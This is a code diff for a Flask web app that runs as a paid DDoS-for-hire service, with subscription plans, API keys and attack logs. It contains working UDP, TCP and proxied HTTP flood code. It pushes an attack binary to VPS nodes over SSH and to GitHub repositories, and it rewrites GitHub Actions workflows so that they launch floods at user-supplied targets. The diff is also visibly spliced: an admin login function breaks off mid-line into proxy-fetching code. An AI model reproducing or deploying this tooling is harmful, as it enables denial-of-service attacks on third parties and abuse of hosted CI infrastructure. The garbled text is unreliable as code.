@@ -97,6 +97,476 @@ class AttackNode(db.Model):
     vps_username = db.Column(db.String(100), nullable=True)
     vps_password = db.Column(db.String(200), nullable=True)
     vps_key_path = db.Column(db.String(200), nullable=True)
+    last_status = db.Column(db.String(50), default="unknown")
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
+class AdminUser(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(80), unique=True, nullable=False)
+    password_hash = db.Column(db.String(200), nullable=False)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
+with app.app_context():
+    db.create_all()
+    if not AdminUser.query.filter_by(username='admin').first():
+        from werkzeug.security import generate_password_hash
+        default_admin = AdminUser(
+            username='admin',
+            password_hash=generate_password_hash('admin123')
+        )
+        db.session.add(default_admin)
+        db.session.commit()
+        print("Default admin created: username 'admin', password 'admin123'")
+    if not User.query.first():
+        default_token = secrets.token_urlsafe(32)
+        default_user = User(token=default_token, plan="Free Plan", max_concurrent=1, max_duration=60)
+        db.session.add(default_user)
+        db.session.commit()
+        print(f"Default user token: {default_token}")
+
+def generate_token():
+    return secrets.token_urlsafe(32)
+
+def get_user_by_token(token):
+    return User.query.filter_by(token=token).first()
+
+def admin_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if 'admin_logged_in' not in session or not session['admin_logged_in']:
+            flash('Please login as admin first', 'danger')
+            return redirect(url_for('admin_login'))
+        return f(*args, **kwargs)
+    return decorated_function
+
+# ---------- Binary Distribution ----------
+def distribute_binary_to_github(node, binary_data):
+    try:
+        g = Github(node.github_token)
+        repo = g.get_repo(node.github_repo)
+        try:
+            contents = repo.get_contents("soul")
+            repo.update_file("soul", "Update binary", binary_data, contents.sha, branch="main")
+        except:
+            repo.create_file("soul", "Add binary", binary_data, branch="main")
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
+def distribute_binary_to_vps(node, binary_data):
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        if node.vps_password:
+            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
+                        password=node.vps_password, timeout=10)
+        else:
+            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
+                        key_filename=node.vps_key_path, timeout=10)
+        sftp = ssh.open_sftp()
+        remote_path = "/root/soul"
+        with sftp.open(remote_path, 'wb') as f:
+            f.write(binary_data)
+        sftp.chmod(remote_path, 0o755)
+        sftp.close()
+        ssh.close()
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
+def check_node_status(node):
+    if node.node_type == 'github':
+        try:
+            g = Github(node.github_token)
+            user = g.get_user()
+            repo = g.get_repo(node.github_repo)
+            node.last_status = "online"
+            db.session.commit()
+            return True, "GitHub OK"
+        except Exception as e:
+            node.last_status = "offline"
+            db.session.commit()
+            return False, str(e)
+    else:
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            if node.vps_password:
+                ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
+                            password=node.vps_password, timeout=5)
+            else:
+                ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
+                            key_filename=node.vps_key_path, timeout=5)
+            ssh.close()
+            node.last_status = "online"
+            db.session.commit()
+            return True, "SSH OK"
+        except Exception as e:
+            node.last_status = "offline"
+            db.session.commit()
+            return False, str(e)
+
+# ---------- Attack Triggers ----------
+def trigger_github_node(node, target, port, duration, method):
+    binary_method = "udp" if method == "UDP" else "tcp" if method == "TCP" else "udp"
+    try:
+        g = Github(node.github_token)
+        repo = g.get_repo(node.github_repo)
+        yml_content = f"""name: attack
+on: [push]
+jobs:
+  attack:
+    runs-on: ubuntu-22.04
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x soul
+      - run: ./soul {target} {port} {duration} {binary_method}
+"""
+        try:
+            contents = repo.get_contents(".github/workflows/main.yml")
+            repo.update_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content, contents.sha)
+        except:
+            repo.create_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content)
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
+def trigger_vps_node(node, target, port, duration, method):
+    binary_method = "udp" if method == "UDP" else "tcp" if method == "TCP" else "udp"
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        if node.vps_password:
+            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
+                        password=node.vps_password, timeout=10)
+        else:
+            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
+                        key_filename=node.vps_key_path, timeout=10)
+        cmd = f"cd /root && ./soul {target} {port} {duration} {binary_method} > /dev/null 2>&1 &"
+        ssh.exec_command(cmd)
+        ssh.close()
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
+def run_local_python(target, port, duration, method):
+    end_time = time.time() + duration
+    packets = 0
+    if method == "UDP":
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        payload = random.randbytes(1024)
+        while time.time() < end_time:
+            sock.sendto(payload, (target, port))
+            packets += 1
+        sock.close()
+    elif method == "TCP":
+        while time.time() < end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                sock.connect_ex((target, port))
+                sock.close()
+                packets += 1
+            except:
+                pass
+    else:
+        url = f"http://{target}:{port}"
+        headers = {"User-Agent": "Mozilla/5.0"}
+        while time.time() < end_time:
+            proxy = get_random_proxy()
+            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
+            try:
+                requests.get(url, headers=headers, proxies=proxies, timeout=3)
+                packets += 1
+            except:
+                pass
+    return packets
+
+def run_attack_on_nodes(user_id, target, port, duration, method, source='web'):
+    nodes = AttackNode.query.filter_by(enabled=True).all()
+    if not nodes:
+        packets = run_local_python(target, port, duration, method)
+        with app.app_context():
+            log = AttackLog(user_id=user_id, target=target, port=port, duration=duration,
+                            method=method, concurrent=1, status='completed')
+            db.session.add(log)
+            db.session.commit()
+            if user_id:
+                user = User.query.get(user_id)
+                if user:
+                    user.total_attacks += 1
+                    user.slots_used = max(0, user.slots_used - 1)
+                    db.session.commit()
+        return
+
+    with app.app_context():
+        log = AttackLog(user_id=user_id, target=target, port=port, duration=duration,
+                        method=method, concurrent=len(nodes))
+        db.session.add(log)
+        db.session.commit()
+        if user_id:
+            user = User.query.get(user_id)
+            if user:
+                user.total_attacks += 1
+                db.session.commit()
+
+    threads = []
+    def worker(node):
+        if node.node_type == 'github':
+            trigger_github_node(node, target, port, duration, method)
+        else:
+            trigger_vps_node(node, target, port, duration, method)
+    for node in nodes:
+        t = threading.Thread(target=worker, args=(node,))
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
+
+    with app.app_context():
+        log.status = 'completed'
+        db.session.commit()
+
+# ---------- Flask Routes ----------
+@app.route('/')
+def index():
+    if 'user_token' in session:
+        return redirect(url_for('dashboard'))
+    return redirect(url_for('login'))
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        token = request.form.get('token')
+        user = get_user_by_token(token)
+        if user:
+            session['user_token'] = token
+            session['user_id'] = user.id
+            flash('Logged in successfully', 'success')
+            return redirect(url_for('dashboard'))
+        flash('Invalid token', 'danger')
+    return render_template_string(LOGIN_HTML)
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'POST':
+        token = generate_token()
+        user = User(token=token, plan="Free Plan", max_concurrent=1, max_duration=60)
+        db.session.add(user)
+        db.session.commit()
+        api_key = secrets.token_urlsafe(32)
+        new_api_key = ApiKey(user_id=user.id, key=api_key, name="Default")
+        db.session.add(new_api_key)
+        db.session.commit()
+        flash(f'Your access token: {token}', 'success')
+        return redirect(url_for('login'))
+    return render_template_string(REGISTER_HTML)
+
+@app.route('/dashboard')
+def dashboard():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    user = User.query.get(session['user_id'])
+    if not user:
+        session.clear()
+        return redirect(url_for('login'))
+    attacks = AttackLog.query.filter_by(user_id=user.id).order_by(AttackLog.timestamp.desc()).limit(10).all()
+    slots_used = user.slots_used
+    max_slots = user.max_concurrent
+    return render_template_string(DASHBOARD_HTML, user=user, attacks=attacks,
+                                  slots_used=slots_used, max_slots=max_slots)
+
+@app.route('/attack', methods=['GET', 'POST'])
+def attack_page():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    user = User.query.get(session['user_id'])
+    if request.method == 'POST':
+        target = request.form.get('target')
+        port = int(request.form.get('port'))
+        duration = int(request.form.get('duration'))
+        method = request.form.get('method')
+        concurrent = int(request.form.get('concurrent', 1))
+        if duration > user.max_duration:
+            flash(f'Duration exceeds limit ({user.max_duration}s)', 'danger')
+            return redirect(url_for('attack_page'))
+        if concurrent > user.max_concurrent:
+            flash(f'Concurrent exceeds limit ({user.max_concurrent})', 'danger')
+            return redirect(url_for('attack_page'))
+        if user.slots_used + concurrent > user.max_concurrent:
+            flash('No free slots', 'danger')
+            return redirect(url_for('attack_page'))
+        user.slots_used += concurrent
+        db.session.commit()
+        thread = threading.Thread(target=run_attack_on_nodes, args=(user.id, target, port, duration, method, 'web'))
+        thread.daemon = True
+        thread.start()
+        flash(f'Attack launched on {target}:{port} ({method})', 'success')
+        return redirect(url_for('attack_page'))
+    return render_template_string(ATTACK_HTML, user=user)
+
+@app.route('/products')
+def products_page():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    user = User.query.get(session['user_id'])
+    plans = [
+        {'name': 'Free Plan', 'price': 'Free', 'concurrent': 1, 'duration': 60, 'methods': 'UDP Only', 'slots': 1},
+        {'name': 'Pro Plan', 'price': '$49/month', 'concurrent': 5, 'duration': 300, 'methods': 'UDP, TCP', 'slots': 5},
+        {'name': 'Enterprise Plan', 'price': '$199/month', 'concurrent': 25, 'duration': 1200, 'methods': 'All Methods', 'slots': 25},
+        {'name': 'Ultimate Plan', 'price': '$499/month', 'concurrent': 100, 'duration': 3600, 'methods': 'All Methods + API', 'slots': 100}
+    ]
+    return render_template_string(PRODUCTS_HTML, user=user, plans=plans)
+
+@app.route('/api/keys', methods=['GET', 'POST'])
+def api_keys():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    user = User.query.get(session['user_id'])
+    if request.method == 'POST':
+        name = request.form.get('name', 'New Key')
+        new_key = secrets.token_urlsafe(32)
+        api_key = ApiKey(user_id=user.id, key=new_key, name=name)
+        db.session.add(api_key)
+        db.session.commit()
+        flash(f'API key created: {new_key}', 'success')
+        return redirect(url_for('api_keys'))
+    keys = ApiKey.query.filter_by(user_id=user.id).all()
+    return render_template_string(API_KEYS_HTML, user=user, keys=keys)
+
+@app.route('/api/keys/<int:key_id>/whitelist', methods=['POST'])
+def update_api_key_whitelist(key_id):
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    key = ApiKey.query.get(key_id)
+    if not key or key.user_id != session['user_id']:
+        flash('API key not found', 'danger')
+        return redirect(url_for('api_keys'))
+    whitelist_ips = request.form.get('whitelist_ips', '').strip()
+    key.whitelist_ips = whitelist_ips
+    db.session.commit()
+    flash('IP whitelist updated', 'success')
+    return redirect(url_for('api_keys'))
+
+@app.route('/api/keys/<int:key_id>/delete', methods=['POST'])
+def delete_api_key(key_id):
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    key = ApiKey.query.get(key_id)
+    if key and key.user_id == session['user_id']:
+        db.session.delete(key)
+        db.session.commit()
+        flash('API key deleted', 'success')
+    return redirect(url_for('api_keys'))
+
+@app.route('/api/attack', methods=['POST'])
+def api_attack():
+    data = request.get_json()
+    if not data:
+        return jsonify({'error': 'Invalid JSON'}), 400
+    api_key = data.get('api_key')
+    target = data.get('target')
+    port = data.get('port')
+    duration = data.get('duration')
+    method = data.get('method', 'UDP')
+    concurrent = data.get('concurrent', 1)
+    if not api_key or not target or not port or not duration:
+        return jsonify({'error': 'Missing parameters'}), 400
+    key_obj = ApiKey.query.filter_by(key=api_key).first()
+    if not key_obj:
+        return jsonify({'error': 'Invalid API key'}), 401
+    # IP whitelist check
+    if key_obj.whitelist_ips:
+        allowed_ips = [ip.strip() for ip in key_obj.whitelist_ips.split(',')]
+        if request.remote_addr not in allowed_ips:
+            return jsonify({'error': 'IP not whitelisted'}), 403
+    user = key_obj.user
+    if duration > user.max_duration:
+        return jsonify({'error': f'Duration exceeds {user.max_duration}s'}), 400
+    if concurrent > user.max_concurrent:
+        return jsonify({'error': f'Concurrent exceeds {user.max_concurrent}'}), 400
+    if user.slots_used + concurrent > user.max_concurrent:
+        return jsonify({'error': 'No free slots'}), 429
+    user.slots_used += concurrent
+    db.session.commit()
+    thread = threading.Thread(target=run_attack_on_nodes, args=(user.id, target, port, duration, method, 'api'))
+    thread.daemon = True
+    thread.start()
+    return jsonify({'status': 'started', 'message': 'Attack started'}), 200
+
+# ---------- Admin Routes ----------
+@app.route('/admin/login', methods=['GET', 'POST'])
+def admin_login():
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        from werkzeug.s            lines = resp.text.splitlines()
+            proxies = [p.strip() for p in lines if ":" in p and p.strip()]
+            if proxies:
+                new_proxies.extend(proxies)
+        except:
+            continue
+    PROXY_LIST = list(set(new_proxies))
+    LAST_PROXY_FETCH = time.time()
+    print(f"[+] Loaded {len(PROXY_LIST)} proxies")
+
+def get_random_proxy():
+    if not PROXY_LIST:
+        fetch_proxies()
+    if PROXY_LIST:
+        return random.choice(PROXY_LIST)
+    return None
+
+fetch_proxies()
+
+# ---------- Database Models ----------
+class User(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    token = db.Column(db.String(128), unique=True, nullable=False)
+    plan = db.Column(db.String(50), default="Free Plan")
+    max_concurrent = db.Column(db.Integer, default=1)
+    max_duration = db.Column(db.Integer, default=60)
+    slots_used = db.Column(db.Integer, default=0)
+    total_attacks = db.Column(db.Integer, default=0)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
+class ApiKey(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
+    key = db.Column(db.String(64), unique=True, nullable=False)
+    name = db.Column(db.String(100), default="Default")
+    whitelist_ips = db.Column(db.Text, default="")
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    user = db.relationship('User', backref=db.backref('api_keys', lazy=True))
+
+class AttackLog(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
+    target = db.Column(db.String(100))
+    port = db.Column(db.Integer)
+    duration = db.Column(db.Integer)
+    method = db.Column(db.String(50))
+    concurrent = db.Column(db.Integer, default=1)
+    status = db.Column(db.String(20), default='running')
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
+    user = db.relationship('User', backref=db.backref('attacks', lazy=True))
+
+class AttackNode(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    name = db.Column(db.String(100), nullable=False)
+    node_type = db.Column(db.String(20), nullable=False)
+    enabled = db.Column(db.Boolean, default=True)
+    github_token = db.Column(db.String(200), nullable=True)
+    github_repo = db.Column(db.String(200), nullable=True)
+    vps_host = db.Column(db.String(100), nullable=True)
+    vps_port = db.Column(db.Integer, default=22)
+    vps_username = db.Column(db.String(100), nullable=True)
+    vps_password = db.Column(db.String(200), nullable=True)
+    vps_key_path = db.Column(db.String(200), nullable=True)
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
 
 class AdminUser(db.Model):
